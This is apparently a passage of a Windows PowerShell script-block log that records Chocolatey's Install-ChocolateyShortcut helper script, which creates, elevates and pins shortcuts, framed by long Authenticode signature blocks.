BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgM4dhQyywPrPo8jpeR3DNbT7H2WdznBS1+Bus # KT2bfQ0wDQYJKoZIhvcNAQEBBQAEggEAbWUKxJRm84/EF8/zeqa1zKe4AWpJ/gEi # QwtcOXs0Qnyft51e8c1xU2GOQZgAGvgSh7/PxsyVsFf5RMUF4KTVDTiF1PBanepr # vyJHjlmCWoa+NIncrLkelzSZLVmR91IGBpxxuL3E03d1rLOBK3MsTsv/n1l0nTzj # Th0bWNHNjcnJ89/jqS6j0E/x06GXwECdXPke/u6rpZ+ne5huAOlJgmce9bBL1v39 # SLEstdUW37fHTfvf8W4O3vdUYwXayuZOv+5ACQA5wVnwEL/jv+qxNFlM1ciPSuDH # DnFvlJp1vUavbyg9F+n4RYni9EUQTAw9F7Izk3Mt3mS6HCFwSwVWtaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQUAIvU+JA/yY/VMDda # AF5AyoutdvkwDQYJKoZIhvcNAQEBBQAEggEAAw12+/6F/pa2s2bjPlFgk4ZjQcRt # p/abG6OoDWEMorncdvyhrOe39oQxthDUOLm/FW8JvvlFNHxBwjCy4KUxPRTsmmBf # JKzuGv9Au1dfjGJAS+lPZyxTC5nyeKbCnG3Zwy77dAxvN2ZVd/vRhyw/itKoE3Lv # MSvUKhrRTFB1Sm7if/dh9r5YiBFCgKoTJJ9PCxIrGOx6R3Gbci+StDJXHBDOqgDh # HNoYd6Z6V6AKPy3mzU3yitDuMA2ugksV6OHroWUCUGfVkUCPHJZMceJVXzYTbCUS # wgDjjauYaSo+kzjicD27CjwNSeHZP0MSLFSoHfoU76lF2iplygQ1pdmkMw== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateyInstall\helpers\functions\Install-ChocolateyShortcut.ps1 ¦ ScriptBlockId: dcbde301-5496-4916-8a76-3e2b1ecc4be1 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyShortcut { <# .SYNOPSIS Creates a shortcut .DESCRIPTION This adds a shortcut, at the specified location, with the option to specify a number of additional properties for the shortcut, such as Working Directory, Arguments, Icon Location, and Description. .NOTES If this errors, as it may if being run under the local SYSTEM account with particular folder that SYSTEM doesn't have, it will display a warning instead of failing a package installation. .INPUTS None .OUTPUTS None .PARAMETER ShortcutFilePath The full absolute path to where the shortcut should be created. .PARAMETER TargetPath The full absolute path to the target for new shortcut. .PARAMETER WorkingDirectory OPTIONAL - The full absolute path of the Working Directory that will be used by the new shortcut. As of v0.10.12, the directory will be created unless it contains environment variable expansion like `%AppData%\FooBar`. .PARAMETER Arguments OPTIONAL - Additonal arguments that should be passed along to the new shortcut. .PARAMETER IconLocation OPTIONAL- The full absolute path to an icon file to be used for the new shortcut. .PARAMETER Description OPTIONAL - A text description to be associated with the new description. .PARAMETER WindowStyle OPTIONAL - Type of windows target application should open with. Available in 0.9.10+. 0 = Hidden, 1 = Normal Size, 3 = Maximized, 7 - Minimized. Full list table 3.9 here: https://technet.microsoft.com/en-us/library/ee156605.aspx .PARAMETER RunAsAdmin OPTIONAL - Set ""Run As Administrator"" checkbox for the created the shortcut. Available in 0.9.10+. .PARAMETER PinToTaskbar OPTIONAL - Pin the new shortcut to the taskbar. Available in 0.9.10+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This will create a new shortcut at the location of ""C:\test.lnk"" and # link to the file located at ""C:\text.exe"" Install-ChocolateyShortcut -ShortcutFilePath ""C:\test.lnk"" -TargetPath ""C:\test.exe"" .EXAMPLE > # This will create a new shortcut at the location of ""C:\notepad.lnk"" # and link to the Notepad application. In addition, other properties # are being set to specify the working directory, an icon to be used for # the shortcut, along with a description and arguments. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WorkingDirectory ""C:\"" ` -Arguments ""C:\test.txt"" ` -IconLocation ""C:\test.ico"" ` -Description ""This is the description"" .EXAMPLE > # Creates a new notepad shortcut on the root of c: that starts # notepad.exe as Administrator. Shortcut is also pinned to taskbar. # These parameters are available in 0.9.10+. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WindowStyle 3 ` -RunAsAdmin ` -PinToTaskbar .LINK Install-ChocolateyDesktopLink .LINK Install-ChocolateyExplorerMenuItem .LINK Install-ChocolateyPinnedTaskBarItem #> param( [parameter(Mandatory=$true, Position=0)][string] $shortcutFilePath, [parameter(Mandatory=$true, Position=1)][string] $targetPath, [parameter(Mandatory=$false, Position=2)][string] $workingDirectory, [parameter(Mandatory=$false, Position=3)][string] $arguments, [parameter(Mandatory=$false, Position=4)][string] $iconLocation, [parameter(Mandatory=$false, Position=5)][string] $description, [parameter(Mandatory=$false, Position=6)][int] $windowStyle, [parameter(Mandatory=$false)][switch] $runAsAdmin, [parameter(Mandatory=$false)][switch] $pinToTaskbar, [parameter(ValueFromRemainingArguments = $true)][Object[]]$ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters # http://powershell.com/cs/blogs/tips/archive/2009/02/05/validating-a-url.aspx function isURIWeb($address) { $uri = $address -as [System.URI] $uri.AbsoluteURI -ne $null -and $uri.Scheme -match '[http|https]' } if (!$shortcutFilePath) { # shortcut file path could be null if someone is trying to get special # paths for LocalSystem (SYSTEM). Write-Warning ""Unable to create shortcut. `$shortcutFilePath can not be null."" return } $shortcutDirectory = $([System.IO.Path]::GetDirectoryName($shortcutFilePath)) if (!(Test-Path($shortcutDirectory))) { [System.IO.Directory]::CreateDirectory($shortcutDirectory) | Out-Null } if (!$targetPath) { throw ""Install-ChocolateyShortcut - `$targetPath can not be null."" } if(!(Test-Path($targetPath)) -and !(IsURIWeb($targetPath))) { Write-Warning ""'$targetPath' does not exist. If it is not created the shortcut will not be valid."" } if($iconLocation) { if(!(Test-Path($iconLocation))) { Write-Warning ""'$iconLocation' does not exist. A default icon will be used."" } } if ($workingDirectory) { if ($workingDirectory -notmatch '%\w+%' -and !(Test-Path($workingDirectory))) { [System.IO.Directory]::CreateDirectory($workingDirectory) | Out-Null } } Write-Debug ""Creating Shortcut..."" try { $global:WshShell = New-Object -com ""WScript.Shell"" $lnk = $global:WshShell.CreateShortcut($shortcutFilePath) $lnk.TargetPath = $targetPath $lnk.WorkingDirectory = $workingDirectory $lnk.Arguments = $arguments if($iconLocation) { $lnk.IconLocation = $iconLocation } if ($description) { $lnk.Description = $description } if ($windowStyle) { $lnk.WindowStyle = $windowStyle } $lnk.Save() Write-Debug ""Shortcut created."" [System.IO.FileInfo]$Path = $shortcutFilePath If ($runAsAdmin) { #In order to enable the ""Run as Admin"" checkbox, this code reads the .LNK as a stream # and flips a specific bit while writing a new copy. It then replaces the original # .LNK with the copy, similar to this example: http://poshcode.org/2513 $TempFileName = [IO.Path]::GetRandomFileName() $TempFile = [IO.FileInfo][IO.Path]::Combine($Path.Directory, $TempFileName) $Writer = New-Object System.IO.FileStream $TempFile, ([System.IO.FileMode]::Create) $Reader = $Path.OpenRead() While ($Reader.Position -lt $Reader.Length) { $Byte = $Reader.ReadByte() If ($Reader.Position -eq 22) {$Byte = 34} $Writer.WriteByte($Byte) } $Reader.Close() $Writer.Close() $Path.Delete() Rename-Item -Path $TempFile -NewName $Path.Name | Out-Null } If ($pinToTaskbar) { $scfilename = $Path.FullName $pinverb = (new-object -com ""shell.application"").namespace($(split-path -parent $Path.FullName)).Parsename($(split-path -leaf $Path.FullName)).verbs() | ?{$_.Name -eq 'Pin to Tas&kbar'} If ($pinverb) {$pinverb.doit()} } } catch { Write-Warning ""Unable to create shortcut. Error captured was $($_.Exception.Message)."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCV4kKnyvkP8Q6w # z2NjPs2m5xO4ValwoIiDMeri2Kx1gKCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # 